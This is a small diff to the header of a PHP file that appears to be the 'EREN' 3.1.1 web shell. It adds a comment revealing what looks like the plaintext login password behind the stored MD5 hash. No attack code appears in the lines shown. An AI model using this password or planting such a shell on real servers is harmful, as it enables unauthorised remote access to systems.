@@ -1,6 +1,6 @@
 <?php
 //If you found a bug, report it here https://github.com/MrDoxxer2/eren/issues 
-$s_pass = "e31dfd49df663193fedd4701c90d8180";
+$s_pass = "e31dfd49df663193fedd4701c90d8180"; //ErenYeager
 $s_ver = "3.1.1";
 $s_title = "EREN ".$s_ver;
 $s_login_time = 3600 * 24 * 7; 
